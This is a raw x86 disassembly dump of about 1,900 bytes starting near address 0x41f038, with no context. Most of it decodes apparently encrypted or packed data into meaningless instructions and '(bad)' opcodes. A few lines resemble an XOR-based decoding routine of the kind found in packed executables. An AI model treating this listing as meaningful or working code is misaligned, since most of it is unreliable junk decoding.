  41f038:	hlt    
  41f039:	test   dl,0xa9
  41f03c:	xchg   DWORD PTR [ebp-0x1225529],ebx
  41f042:	add    eax,0x3086e53b
  41f047:	inc    edi
  41f048:	or     DWORD PTR [ecx-0x93f7c21],eax
  41f04e:	xchg   esp,eax
  41f04f:	inc    ebp
  41f050:	xchg   edi,ebp
  41f052:	jo     0x41f012
  41f054:	nop
  41f055:	popa   
  41f056:	pusha  
  41f057:	mov    ecx,DWORD PTR [edx]
  41f059:	push   0xffffff90
  41f05b:	xchg   esi,eax
  41f05c:	mov    edx,0x238d8625
  41f061:	in     eax,dx
  41f062:	inc    ecx
  41f063:	xlat   BYTE PTR ds:[ebx]
  41f064:	jnp    0x41f015
  41f066:	add    DWORD PTR [esi-0xcbe20e8],ecx
  41f06c:	or     al,0xb3
  41f06e:	xchg   edx,eax
  41f06f:	mov    edi,0xf1fc5877
  41f074:	xchg   ebx,eax
  41f075:	(bad)  
  41f077:	test   DWORD PTR [esi-0x37],0x89b8ca6c
  41f07e:	neg    esp
  41f080:	stos   DWORD PTR es:[edi],eax
  41f081:	mov    ebp,0xbe2fd10d
  41f086:	cmp    al,0xa2
  41f088:	enter  0x7ead,0xea
  41f08c:	test   al,0x77
  41f08e:	loope  0x41f037
  41f090:	add    dh,BYTE PTR [ebp-0x5ff84708]
  41f096:	inc    edi
  41f097:	sahf   
  41f098:	(bad)  
  41f099:	mov    cl,0xf8
  41f09b:	push   ss
  41f09c:	add    al,0x1f
  41f09e:	icebp  
  41f09f:	add    eax,0xf889a788
  41f0a4:	mov    ah,0xb7
  41f0a6:	ins    BYTE PTR es:[edi],dx
  41f0a7:	pop    ss
  41f0a8:	jo     0x41f0eb
  41f0aa:	ds dec esp
  41f0ac:	les    esi,FWORD PTR [ebx-0x6f42aed1]
  41f0b2:	cmp    al,0x3c
  41f0b4:	cmp    BYTE PTR [esi-0x5e096f15],cl
  41f0ba:	lock lods eax,DWORD PTR ds:[esi]
  41f0bc:	xchg   BYTE PTR [eax-0x39941e41],cl
  41f0c2:	adc    DWORD PTR [edi+0x6b],edi
  41f0c5:	out    dx,eax
  41f0c6:	loop   0x41f0f5
  41f0c8:	pop    ebx
  41f0c9:	out    0xbe,al
  41f0cb:	sbb    al,0x1f
  41f0cd:	test   cl,ch
  41f0cf:	cmp    al,0x8
  41f0d1:	outs   dx,DWORD PTR ds:[esi]
  41f0d2:	lock icebp 
  41f0d4:	nop
  41f0d5:	push   esi
  41f0d6:	xor    BYTE PTR [ebp-0x508f6ba6],dl
  41f0dc:	out    0x5,al
  41f0de:	mov    ecx,0xcb358cb5
  41f0e3:	jg     0x41f0be
  41f0e5:	mov    ds:0xdf486290,al
  41f0ea:	xor    bl,dl
  41f0ec:	cmc    
  41f0ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0ee:	dec    BYTE PTR [esi-0x52a89cdb]
  41f0f4:	das    
  41f0f5:	mov    bh,0x16
  41f0f7:	inc    esp
  41f0f8:	add    BYTE PTR [ecx+0x9b3672f],bl
  41f0fe:	pop    ds
  41f0ff:	push   ebx
  41f100:	mov    es,WORD PTR [ecx+0x40d4247c]
  41f106:	div    DWORD PTR [edi+esi*1+0x5606461]
  41f10d:	es sbb al,0xfd
  41f110:	mov    ebp,0xbae895de
  41f115:	test   eax,0x5f215e1c
  41f11a:	pop    ss
  41f11b:	fld    TBYTE PTR [eax-0x3cdb2179]
  41f121:	xchg   dh,dh
  41f123:	scas   eax,DWORD PTR es:[edi]
  41f124:	adc    BYTE PTR ds:0x3a2ca2a8,bl
  41f12a:	dec    esi
  41f12b:	mov    BYTE PTR [edx+0x42],dl
  41f12e:	sub    ch,BYTE PTR [edx-0x8]
  41f131:	js     0x41f0e1
  41f133:	push   es
  41f134:	stos   BYTE PTR es:[edi],al
  41f135:	sbb    DWORD PTR [esi+0x4ebcfef],ebx
  41f13b:	outs   dx,DWORD PTR ds:[esi]
  41f13c:	pop    ecx
  41f13d:	jae    0x41f1b9
  41f13f:	popf   
  41f140:	daa    
  41f141:	push   0xd00a34d7
  41f146:	pop    esp
  41f147:	inc    ebp
  41f148:	jmp    0x571e792f
  41f14d:	outs   dx,DWORD PTR ds:[esi]
  41f14e:	xchg   DWORD PTR [ebx+eiz*8-0xe],edi
  41f152:	mov    al,ds:0xa3ae925
  41f157:	std    
  41f158:	dec    edx
  41f159:	(bad)  
  41f15a:	hlt    
  41f15b:	in     eax,0x47
  41f15d:	jnp    0x41f121
  41f15f:	pop    esp
  41f160:	xor    ecx,DWORD PTR [edi]
  41f162:	mov    dx,0xb482
  41f166:	jl     0x41f162
  41f168:	in     al,dx
  41f169:	repnz cmc 
  41f16b:	inc    ebp
  41f16c:	sbb    DWORD PTR [ecx-0x4f],ebx
  41f16f:	daa    
  41f170:	mov    DWORD PTR [edi],edx
  41f172:	push   edi
  41f173:	mov    eax,0x96db22d1
  41f178:	push   0xffffffad
  41f17a:	push   edx
  41f17b:	add    BYTE PTR [ecx+0x56],ch
  41f17e:	push   0xffffffe6
  41f180:	add    eax,0x1d7655b5
  41f185:	and    eax,0x2effcba1
  41f18a:	rcr    BYTE PTR [esi+0x527186a7],0x2
  41f191:	ins    BYTE PTR es:[edi],dx
  41f192:	mov    bh,0x93
  41f194:	call   DWORD PTR [ecx+0x1d]
  41f197:	scas   al,BYTE PTR es:[edi]
  41f198:	popf   
  41f199:	rol    BYTE PTR [eax+edi*8],cl
  41f19c:	and    eax,0x361b0f16
  41f1a1:	scas   al,BYTE PTR es:[edi]
  41f1a2:	jae    0x41f174
  41f1a4:	xchg   edx,eax
  41f1a5:	pop    ds
  41f1a6:	dec    edx
  41f1a7:	fdiv   QWORD PTR [edx-0x667ebd25]
  41f1ad:	dec    edi
  41f1ae:	inc    edx
  41f1af:	push   ebp
  41f1b0:	cwde   
  41f1b1:	int    0x1a
  41f1b3:	mov    ecx,tr2
  41f1b6:	add    ebx,DWORD PTR [ecx]
  41f1b8:	xchg   edx,eax
  41f1b9:	into   
  41f1ba:	push   0xb641008
  41f1bf:	(bad)  
  41f1c1:	popa   
  41f1c2:	sbb    BYTE PTR [edi+0x679475e1],cl
  41f1c8:	mov    eax,0x181f8783
  41f1cd:	xchg   ebx,edx
  41f1cf:	or     al,0xca
  41f1d1:	dec    edx
  41f1d2:	and    ecx,eax
  41f1d4:	rcr    DWORD PTR [eax+0x51d4c03a],0x62
  41f1db:	mov    ecx,0x7e4f0502
  41f1e0:	mov    ah,0x39
  41f1e2:	call   0x5d89:0x1910dab1
  41f1e9:	pop    edx
  41f1ea:	jl     0x41f1d8
  41f1ec:	mov    ds:0x816a9230,eax
  41f1f1:	mov    ?,WORD PTR [ebx-0x59]
  41f1f4:	es out 0xd3,eax
  41f1f7:	rol    DWORD PTR [ebp+ebp*1-0x6a],1
  41f1fb:	mov    edi,DWORD PTR [eax-0xb38ab4f]
  41f201:	fist   WORD PTR [esi+0x678ffd43]
  41f207:	stos   BYTE PTR es:[edi],al
  41f208:	jbe    0x41f1e1
  41f20a:	pop    edx
  41f20b:	addr16 adc al,0x94
  41f20e:	lea    esi,[esi+0x3e]
  41f211:	cwde   
  41f212:	fist   WORD PTR [edi]
  41f214:	push   cs
  41f215:	(bad)  
  41f216:	pusha  
  41f217:	shl    BYTE PTR [eax],cl
  41f219:	sub    eax,0xb3e43216
  41f21e:	inc    BYTE PTR [ecx+0x54]
  41f221:	sahf   
  41f222:	inc    edi
  41f223:	add    al,0x53
  41f225:	mov    cl,0x2b
  41f227:	xchg   ecx,ebx
  41f229:	and    cl,ch
  41f22b:	rcr    DWORD PTR [ebx-0x55],cl
  41f22e:	pop    ss
  41f22f:	xor    eax,0x12a0017
  41f234:	jbe    0x41f1e7
  41f236:	ret    
  41f237:	out    0xa0,al
  41f239:	adc    eax,DWORD PTR cs:[ecx+0x1b]
  41f23d:	push   eax
  41f23e:	xchg   DWORD PTR [edi-0x77],esi
  41f241:	test   al,0x99
  41f243:	shl    bh,0x79
  41f246:	adc    DWORD PTR [eax+0x1864515b],0x79c3e512
  41f250:	inc    esi
  41f251:	push   ebx
  41f252:	mov    esi,0x22ae33cc
  41f257:	pop    ebp
  41f258:	pop    es
  41f259:	inc    ecx
  41f25a:	or     bh,bh
  41f25c:	inc    esi
  41f25d:	add    ebx,DWORD PTR [ebx+0x21]
  41f260:	fistp  WORD PTR [eax+0x276a0158]
  41f266:	fild   DWORD PTR [esi+0x4527d57d]
  41f26c:	push   ebp
  41f26d:	or     dl,BYTE PTR [ebp-0x391a1b9c]
  41f273:	sub    BYTE PTR [ebx-0x59],bl
  41f276:	nop
  41f277:	push   ds
  41f278:	addr16 xor esp,ebx
  41f27b:	stos   DWORD PTR es:[edi],eax
  41f27c:	mov    ah,0x2f
  41f27e:	mul    BYTE PTR [ecx-0x7ccc8462]
  41f284:	retf   
  41f285:	in     eax,0xff
  41f287:	mov    cl,0xf2
  41f289:	leave  
  41f28a:	sbb    eax,esp
  41f28c:	and    al,0xd2
  41f28e:	jbe    0x41f24b
  41f290:	gs cwde 
  41f292:	cli    
  41f293:	test   eax,0xa2b0af0f
  41f298:	ins    DWORD PTR es:[edi],dx
  41f299:	leave  
  41f29a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f29b:	in     eax,0x64
  41f29d:	dec    esi
  41f29e:	xchg   edx,eax
  41f29f:	mov    dh,0xe2
  41f2a1:	stc    
  41f2a2:	and    eax,0x56ea22b8
  41f2a7:	ret    0xeee3
  41f2aa:	mov    ebx,0x28d9b25d
  41f2af:	leave  
  41f2b0:	dec    eax
  41f2b1:	adc    cl,BYTE PTR [ecx+0x21646b33]
  41f2b7:	adc    esi,DWORD PTR [edi+eax*2]
  41f2ba:	shr    ah,cl
  41f2bc:	pop    esp
  41f2bd:	adc    DWORD PTR [ecx-0x6f],ebx
  41f2c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2c1:	xor    edx,eax
  41f2c3:	mov    ds:0x15e10918,al
  41f2c8:	fstp   TBYTE PTR [edi-0x583e0080]
  41f2ce:	inc    edi
  41f2cf:	popf   
  41f2d0:	sbb    BYTE PTR [esi-0x58],0xcc
  41f2d4:	(bad)  
  41f2d6:	jb     0x41f292
  41f2d8:	pop    esi
  41f2d9:	xchg   BYTE PTR [ebx-0x45],al
  41f2dc:	das    
  41f2dd:	xor    al,0x3a
  41f2df:	pushf  
  41f2e0:	inc    esp
  41f2e1:	imul   eax,DWORD PTR ds:0xf3a89228,0x20
  41f2e8:	sbb    eax,0x1b56a6c8
  41f2ed:	inc    ecx
  41f2ee:	sbb    BYTE PTR [edx+ebp*2+0x1e],0x45
  41f2f3:	das    
  41f2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2f5:	sbb    al,0x9a
  41f2f7:	pushf  
  41f2f8:	enter  0xc8d7,0xc
  41f2fc:	mov    ah,0x0
  41f2fe:	and    BYTE PTR [esi+0x5320f89c],bh
  41f304:	ins    DWORD PTR es:[edi],dx
  41f305:	jmp    FWORD PTR [ecx-0x39496d0d]
  41f30b:	mov    ch,0xa8
  41f30d:	push   0x65116b24
  41f312:	stos   BYTE PTR es:[edi],al
  41f313:	or     edi,DWORD PTR [eax+esi*8-0x14]
  41f317:	inc    ebx
  41f318:	dec    ebp
  41f319:	stc    
  41f31a:	mov    ebx,0xcce33e23
  41f31f:	shl    BYTE PTR [ebp+edx*4+0x1f],0xdd
  41f324:	shl    BYTE PTR [edi+ecx*2-0x50cbe6a8],0x44
  41f32c:	sub    DWORD PTR [esi-0x57],eax
  41f32f:	push   edx
  41f330:	scas   eax,DWORD PTR es:[edi]
  41f331:	xor    DWORD PTR [esi],ecx
  41f333:	jecxz  0x41f303
  41f335:	mov    DWORD PTR [ecx],esp
  41f337:	push   eax
  41f338:	ins    DWORD PTR es:[edi],dx
  41f339:	mov    ds:0x38c03d2e,eax
  41f33e:	mulps  xmm3,xmm3
  41f341:	nop
  41f342:	adc    al,0x8c
  41f344:	mov    edx,0x19b5d490
  41f349:	out    dx,al
  41f34a:	pop    ebp
  41f34b:	retf   0x856f
  41f34e:	xchg   edx,eax
  41f34f:	or     BYTE PTR [edx],al
  41f351:	push   ecx
  41f352:	(bad)  [ebx]
  41f354:	mov    ah,0x3d
  41f356:	mov    ch,BYTE PTR [esi+0x7c]
  41f359:	shr    DWORD PTR [eax+edi*4+0x1f],1
  41f35d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f35e:	hlt    
  41f35f:	cwde   
  41f360:	pop    edi
  41f361:	fdivr  QWORD PTR [edx+ebx*2]
  41f364:	adc    al,0x8e
  41f366:	shr    BYTE PTR [esi-0x60ef6b50],cl
  41f36c:	cmc    
  41f36d:	shl    BYTE PTR [ebx-0x221493d5],1
  41f373:	and    eax,0xba887291
  41f378:	xor    al,0x2f
  41f37a:	mov    ecx,0x6843699e
  41f37f:	clc    
  41f380:	loopne 0x41f318
  41f382:	stos   DWORD PTR es:[edi],eax
  41f383:	stc    
  41f384:	loope  0x41f3f8
  41f386:	or     dh,BYTE PTR [ebx+ecx*2]
  41f389:	xor    DWORD PTR [ebx-0x4a],eax
  41f38c:	mov    edi,fs
  41f38e:	push   ds
  41f38f:	cli    
  41f390:	iret   
  41f391:	loop   0x41f3e2
  41f393:	sub    BYTE PTR [edx+ebx*2],dl
  41f396:	jne    0x41f3f4
  41f398:	add    esi,edx
  41f39a:	iret   
  41f39b:	fbstp  TBYTE PTR [edi]
  41f39d:	out    dx,al
  41f39e:	(bad)  
  41f39f:	leave  
  41f3a0:	jecxz  0x41f3c7
  41f3a2:	mov    bh,0x31
  41f3a4:	mov    dh,0xf4
  41f3a6:	jno    0x41f3c8
  41f3a8:	cmp    eax,0x707ad860
  41f3ad:	and    bl,al
  41f3af:	shl    BYTE PTR [eax+ebp*4+0x18],cl
  41f3b3:	shl    DWORD PTR [esi+0x3ab7e9c8],1
  41f3b9:	mov    WORD PTR [edx+0x5582d070],ds
  41f3bf:	imul   edx,DWORD PTR [edi],0xfe7d075
  41f3c5:	jo     0x41f39f
  41f3c7:	test   al,0x2c
  41f3c9:	or     DWORD PTR [ebx+0x724df126],edx
  41f3cf:	out    0x37,al
  41f3d1:	jnp    0x41f37e
  41f3d3:	shl    DWORD PTR [edx],cl
  41f3d5:	ins    BYTE PTR es:[edi],dx
  41f3d6:	mov    ds:0x7dcfc0b2,al
  41f3db:	push   0x51
  41f3dd:	adc    BYTE PTR [edi+eax*8],al
  41f3e0:	jnp    0x41f45b
  41f3e2:	or     ebp,esi
  41f3e4:	fs and edx,ebx
  41f3e7:	inc    ebp
  41f3e8:	and    edi,ebp
  41f3ea:	lods   al,BYTE PTR ds:[esi]
  41f3eb:	retf   0x62d6
  41f3ee:	mov    ch,0x46
  41f3f0:	pop    ebp
  41f3f1:	je     0x41f3ac
  41f3f3:	dec    edx
  41f3f4:	mov    WORD PTR [ecx+ecx*1-0x7c],gs
  41f3f8:	mov    ds:0xc2229b2a,ax
  41f3fe:	mov    cl,0xcb
  41f400:	sub    al,0x3a
  41f402:	int3   
  41f403:	mov    eax,0x22a6a591
  41f408:	pop    ebp
  41f409:	inc    eax
  41f40a:	sub    BYTE PTR [esi+0x1d96672b],ch
  41f410:	fsubr  st(1),st
  41f412:	mov    al,ds:0x84c163e
  41f417:	sar    DWORD PTR [ebx],0xb6
  41f41a:	jb     0x41f471
  41f41c:	fisttp DWORD PTR [edx+0x79]
  41f41f:	jge    0x41f443
  41f421:	jnp    0x41f43f
  41f423:	loope  0x41f42d
  41f425:	dec    esp
  41f426:	jnp    0x41f4a2
  41f428:	pop    edi
  41f429:	dec    ebx
  41f42a:	not    BYTE PTR [edx+0x2d]
  41f42d:	jnp    0x41f3b2
  41f42f:	cmp    ecx,DWORD PTR [ebx+eiz*1+0x3d2a9517]
  41f436:	jmp    0xb33a949c
  41f43b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f43c:	repz xchg ebp,eax
  41f43e:	aas    
  41f43f:	push   0xffffffd4
  41f441:	outs   dx,DWORD PTR ds:[esi]
  41f442:	sbb    eax,0xbf1c0a2d
  41f447:	inc    esi
  41f448:	in     al,0xc6
  41f44a:	xchg   ebx,eax
  41f44b:	jmp    DWORD PTR [ebx+0x48]
  41f44e:	cwde   
  41f44f:	xchg   BYTE PTR [esi],dh
  41f451:	neg    DWORD PTR [esi]
  41f453:	aaa    
  41f454:	and    eax,0x6e4ca7fe
  41f459:	xchg   DWORD PTR [ebx+ebp*1],ecx
  41f45c:	dec    edx
  41f45d:	or     BYTE PTR [edi+0x44a4c91a],ah
  41f463:	dec    edi
  41f464:	pop    ds
  41f465:	lock mov bx,?
  41f469:	lods   eax,DWORD PTR ds:[esi]
  41f46a:	cs xchg edx,eax
  41f46c:	mov    bl,dl
  41f46e:	push   es
  41f46f:	add    DWORD PTR [ebx],edi
  41f471:	push   eax
  41f472:	pop    esp
  41f473:	and    al,0x2f
  41f475:	fs (bad) 
  41f477:	jmp    0x7e62:0x7c28da10
  41f47e:	cmp    al,0x7b
  41f480:	add    al,BYTE PTR ds:0x74cfbf5a
  41f486:	sahf   
  41f487:	add    eax,0xf989a88a
  41f48c:	and    al,0x65
  41f48e:	xchg   bh,cl
  41f490:	adc    eax,0xa7a543c6
  41f495:	scas   al,BYTE PTR es:[edi]
  41f496:	mov    ds:0x17f0fd48,al
  41f49b:	xchg   esi,eax
  41f49c:	xchg   dl,cl
  41f49e:	sahf   
  41f49f:	cmp    BYTE PTR [esi-0x3],bl
  41f4a2:	cmp    edx,edx
  41f4a4:	imul   eax,DWORD PTR [esi-0x63],0xca504db6
  41f4ab:	outs   dx,BYTE PTR es:[esi]
  41f4ad:	push   cs
  41f4ae:	inc    esi
  41f4af:	jbe    0x41f50d
  41f4b1:	or     dh,BYTE PTR [ecx-0x33]
  41f4b4:	inc    ecx
  41f4b5:	pop    edi
  41f4b6:	fdivr  DWORD PTR [eax-0x14fafa10]
  41f4bc:	icebp  
  41f4bd:	call   0x6d52:0xaf0ba7ef
  41f4c4:	repz fst QWORD PTR [edx-0x10]
  41f4c8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4ca:	loop   0x41f509
  41f4cc:	lds    edx,FWORD PTR [eax]
  41f4ce:	mov    cl,0x84
  41f4d0:	pop    esp
  41f4d1:	fiadd  WORD PTR [edi]
  41f4d3:	shl    BYTE PTR ds:0x67c9cd8,0xee
  41f4da:	test   al,0x16
  41f4dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4dd:	mov    ebx,DWORD PTR [eax]
  41f4df:	sub    bl,BYTE PTR [ebx]
  41f4e1:	push   esp
  41f4e2:	daa    
  41f4e3:	bound  edi,QWORD PTR [ecx+0x37]
  41f4e6:	lods   al,BYTE PTR ds:[esi]
  41f4e7:	popa   
  41f4e8:	jno    0x41f545
  41f4ea:	jmp    0x6006:0xa4b5d46f
  41f4f1:	mov    ebx,0xa904f55a
  41f4f6:	adc    cl,BYTE PTR [esi-0x6ef7dfb7]
  41f4fc:	mov    ds:0xe0c2a23b,eax
  41f501:	lods   eax,DWORD PTR ds:[esi]
  41f502:	push   0xffffffcf
  41f504:	xlat   BYTE PTR ds:[ebx]
  41f505:	add    BYTE PTR [edx-0x3b79ef2e],dl
  41f50b:	loopne 0x41f584
  41f50d:	mov    bh,0x37
  41f50f:	in     al,0x9c
  41f511:	popa   
  41f512:	push   ebx
  41f513:	je     0x41f505
  41f515:	dec    edi
  41f516:	jg     0x41f570
  41f518:	ret    
  41f519:	sub    eax,0xfb4b6547
  41f51e:	jbe    0x41f578
  41f520:	in     al,0xb2
  41f522:	les    eax,FWORD PTR [edi]
  41f524:	retf   
  41f525:	test   dh,0xd0
  41f528:	adc    dl,BYTE PTR [ebx]
  41f52a:	outs   dx,BYTE PTR ds:[esi]
  41f52b:	(bad)  
  41f52c:	out    0x82,al
  41f52e:	pop    ss
  41f52f:	sub    dl,BYTE PTR [edx]
  41f531:	inc    esp
  41f532:	bound  ecx,QWORD PTR [ecx+0x52da5203]
  41f538:	sub    BYTE PTR [ecx-0x38f0f127],bh
  41f53e:	mov    dh,0xd1
  41f540:	popf   
  41f541:	idiv   al
  41f543:	sbb    DWORD PTR [edi+0x9],edi
  41f546:	dec    edi
  41f547:	jecxz  0x41f57f
  41f549:	(bad)  
  41f54a:	jmp    0xe20e:0xd39e0024
  41f551:	mov    ds:0x676d00e8,eax
  41f556:	push   edx
  41f557:	jmp    0x2a85:0x31bbc162
  41f55e:	rcr    ch,1
  41f560:	fist   DWORD PTR [ebx-0x1d]
  41f563:	sub    dl,bl
  41f565:	cmp    DWORD PTR [ecx-0x34],ebp
  41f568:	jmp    DWORD PTR [edi+0x604859ac]
  41f56e:	jae    0x41f500
  41f570:	lods   eax,DWORD PTR ds:[esi]
  41f571:	inc    ebx
  41f572:	add    bh,BYTE PTR [ebx+eax*8]
  41f575:	push   0xffffffbe
  41f577:	jle    0x41f571
  41f579:	(bad)  
  41f57a:	push   0xffffffee
  41f57c:	mov    ds:0xd7a2d701,eax
  41f581:	dec    edi
  41f582:	(bad)  
  41f583:	xor    ebx,eax
  41f585:	push   edx
  41f586:	add    eax,0xc9ee865b
  41f58b:	rcl    DWORD PTR [eax+0x21de825d],1
  41f591:	test   eax,0xcf517f44
  41f596:	fwait
  41f597:	js     0x41f52a
  41f599:	sbb    eax,0x923a848d
  41f59e:	push   ecx
  41f59f:	mov    DWORD PTR [bx],0xc2a6ae8e
  41f5a6:	std    
  41f5a7:	(bad)  
  41f5a8:	not    BYTE PTR [edi-0x1b]
  41f5ab:	in     eax,dx
  41f5ac:	push   eax
  41f5ad:	xor    DWORD PTR [edi],ebp
  41f5af:	test   eax,0xac674779
  41f5b4:	daa    
  41f5b5:	xchg   DWORD PTR [edx],ecx
  41f5b7:	imul   ecx,DWORD PTR [ebp-0x49],0x333f8af1
  41f5be:	test   al,0x21
  41f5c0:	aas    
  41f5c1:	(bad)  
  41f5c3:	test   eax,0xe52b2d76
  41f5c8:	adc    eax,0xbcd1085d
  41f5cd:	lods   al,BYTE PTR ds:[esi]
  41f5ce:	fbld   TBYTE PTR [ecx+0x65be45bb]
  41f5d4:	lods   eax,DWORD PTR ds:[esi]
  41f5d5:	int3   
  41f5d6:	sar    BYTE PTR [edx+ebp*8+0x41313665],0x51
  41f5de:	add    BYTE PTR [ebx+0x30],dl
  41f5e1:	daa    
  41f5e2:	ja     0x41f5fd
  41f5e4:	outs   dx,BYTE PTR ds:[esi]
  41f5e5:	mov    ds:0x403947d2,eax
  41f5ea:	retf   
  41f5eb:	add    DWORD PTR [esi+eax*4+0x6da06a97],eax
  41f5f2:	out    dx,eax
  41f5f3:	mov    dh,0xad
  41f5f6:	xor    al,bh
  41f5f8:	stos   BYTE PTR es:[edi],al
  41f5f9:	mov    eax,ds:0x4bde1abb
  41f5fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5ff:	out    dx,eax
  41f600:	repnz fcmovnb st,st(4)
  41f603:	call   0x18be:0x7e62c415
  41f60a:	inc    ebx
  41f60b:	pop    ecx
  41f60c:	js     0x41f617
  41f60e:	stc    
  41f60f:	ins    BYTE PTR es:[edi],dx
  41f610:	clc    
  41f611:	jge    0x41f5de
  41f613:	fs (bad) 
  41f615:	arpl   WORD PTR [esi-0x285ba142],di
  41f61b:	js     0x41f669
  41f61d:	cmp    ah,BYTE PTR [eax+0x6a]
  41f620:	stos   BYTE PTR es:[edi],al
  41f621:	mov    esi,0xa4248deb
  41f626:	jmp    0x9f0d20f2
  41f62b:	pop    esi
  41f62c:	push   cs
  41f62d:	add    ebx,DWORD PTR [ebp-0x44]
  41f630:	mov    DWORD PTR [ebp-0x44],ebx
  41f633:	mov    edx,DWORD PTR [ebp+0x8]
  41f636:	xor    edx,eax
  41f638:	add    edx,esi
  41f63a:	jne    0x41aeb1
  41f640:	mov    edx,DWORD PTR [ebp-0x8]
  41f643:	mov    ebx,DWORD PTR [ebp-0xc]
  41f646:	xor    edx,eax
  41f648:	lea    edx,[edx+ebx*1+0x3272e0]
  41f64f:	mov    DWORD PTR [ebp-0xc],edx
  41f652:	inc    DWORD PTR [ebp+0xc]
  41f655:	mov    edx,DWORD PTR [ebp-0x14]
  41f658:	xor    edx,eax
  41f65a:	add    edx,esi
  41f65c:	jmp    0x4219e5
  41f661:	out    dx,al
  41f662:	(bad)  
  41f664:	call   0xc42ec61c
  41f669:	jmp    0xfb1:0xf211cc5e
  41f670:	fwait
  41f671:	add    edx,0x5f067a79
  41f677:	jp     0x41f6f3
  41f679:	adc    BYTE PTR [esi-0x5f],dl
  41f67c:	int    0x4c
  41f67e:	mov    dl,0x60
  41f680:	sti    
  41f681:	ror    DWORD PTR [esi],cl
  41f683:	retf   0xb52b
  41f686:	out    dx,eax
  41f687:	jno    0x41f623
  41f689:	cmp    BYTE PTR [eax+0x6e],0xf7
  41f68d:	scas   eax,DWORD PTR es:[edi]
  41f68e:	fistp  DWORD PTR gs:[ebx-0x4d256e5b]
  41f695:	addr16 inc eax
  41f697:	stos   BYTE PTR es:[edi],al
  41f698:	outs   dx,BYTE PTR ds:[esi]
  41f699:	sbb    dl,BYTE PTR [eax]
  41f69b:	xor    DWORD PTR [ecx-0x74],ecx
  41f69e:	push   ss
  41f69f:	cli    
  41f6a0:	xor    eax,edi
  41f6a2:	into   
  41f6a3:	ret    
  41f6a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6a5:	mov    cl,0xcc
  41f6a7:	jbe    0x41f6f8
  41f6a9:	sub    al,0xe7
  41f6ab:	jp     0x41f649
  41f6ad:	cvtps2pi mm7,QWORD PTR [ebx+0xef805cb]
  41f6b4:	xor    esp,DWORD PTR [edi]
  41f6b6:	ins    DWORD PTR es:[edi],dx
  41f6b7:	xchg   esi,eax
  41f6b8:	lods   al,BYTE PTR ds:[esi]
  41f6b9:	stos   DWORD PTR es:[edi],eax
  41f6ba:	inc    eax
  41f6bb:	push   ebp
  41f6bc:	hlt    
  41f6bd:	push   cs
  41f6be:	mov    al,ds:0xc0b9a4fd
  41f6c3:	xchg   BYTE PTR [ecx],cl
  41f6c5:	rcr    edx,0xda
  41f6c8:	mov    esp,0xc98f9641
  41f6cd:	ret    
  41f6ce:	adc    esi,DWORD PTR [eax+0x54a549dc]
  41f6d4:	adc    BYTE PTR [edx+0x61],ah
  41f6d7:	cwde   
  41f6d8:	pop    esi
  41f6d9:	xchg   esi,eax
  41f6da:	mov    ds:0xa8c7e40a,al
  41f6df:	inc    esp
  41f6e0:	ja     0x41f737
  41f6e2:	hlt    
  41f6e3:	jmp    0x495c:0xd169bfb1
  41f6ea:	xor    al,0x82
  41f6ec:	sti    
  41f6ed:	nop
  41f6ee:	les    esp,FWORD PTR [eax+0x79]
  41f6f1:	leave  
  41f6f2:	adc    BYTE PTR [ebx+0x49a9adbc],dl
  41f6f8:	ror    DWORD PTR [ebx+0x3a],0xd9
  41f6fc:	inc    ebx
  41f6fd:	mov    al,ds:0xc893a8b4
  41f702:	(bad)  
  41f703:	push   ecx
  41f704:	xchg   edi,eax
  41f705:	prefetcht1 BYTE PTR [edx+0x529564d0]
  41f70c:	jl     0x41f6ea
  41f70e:	jbe    0x41f6c6
  41f710:	mov    ch,0x42
  41f712:	jecxz  0x41f6ed
  41f714:	sti    
  41f715:	call   0x336:0xbad04b1c
  41f71c:	clc    
  41f71d:	(bad)  
  41f71e:	sahf   
  41f71f:	push   ebp
  41f720:	stos   DWORD PTR es:[edi],eax
  41f721:	or     al,0x7
  41f723:	loop   0x41f745
  41f725:	rcr    BYTE PTR [ebx+0x3d87358f],0xb6
  41f72c:	xchg   ah,ah
  41f72e:	adc    ebx,DWORD PTR [edx]
  41f730:	test   al,0xe6
  41f732:	in     al,0xd7
  41f734:	outs   dx,DWORD PTR ds:[esi]
  41f735:	fisub  WORD PTR [edi-0x6d]
  41f738:	push   esp
  41f739:	aas    
  41f73a:	ins    DWORD PTR es:[edi],dx
  41f73b:	repnz mov ebx,0xe3c5d89c
  41f741:	jns    0x41f6fb
  41f743:	(bad)  
  41f744:	pop    ds
  41f745:	xchg   ebp,eax
  41f746:	inc    ebx
  41f747:	call   0xedeb7cd2
  41f74c:	and    al,0xe7
  41f74e:	dec    esp
  41f74f:	add    DWORD PTR [ebp+0x5c],ebx
  41f752:	in     eax,dx
  41f753:	add    bl,0x6c
  41f756:	repnz inc ebx
  41f758:	fs sar ch,1
  41f75b:	jns    0x41f793
  41f75d:	cmp    cl,BYTE PTR [edi-0x20]
  41f760:	iret   
  41f761:	cdq    
  41f762:	or     cl,bh
  41f764:	mov    edx,0xcbd52362
  41f769:	dec    esp
  41f76a:	gs out dx,al
  41f76c:	pop    edx
  41f76d:	and    eax,0x896fb999
  41f772:	fsub   DWORD PTR [ecx-0x44]
  41f775:	(bad)  
  41f776:	mov    al,cs:0xa551ba28
  41f77c:	jge    0x41f7e7
  41f77e:	jno    0x41f708
  41f780:	add    DWORD PTR [edi],ecx
  41f782:	mov    edx,0xcb775f2c
  41f787:	inc    esi
  41f788:	push   0xffffffdd
  41f78a:	into   
  41f78b:	jns    0x41f754
  41f78d:	rcl    edx,1
  41f78f:	imul   ebp,ebp,0x5f
  41f792:	int3   
  41f793:	mov    ds:0x48592a64,al
  41f798:	xchg   DWORD PTR [edi-0x3a],ebp
  41f79b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f79c:	das    
  41f79d:	ins    DWORD PTR es:[edi],dx
  41f79e:	fadd   QWORD PTR [edx-0x59228c97]
  41f7a4:	push   ebx
  41f7a5:	call   0xc97e:0x2a23dd5c
  41f7ac:	fild   WORD PTR [eax]
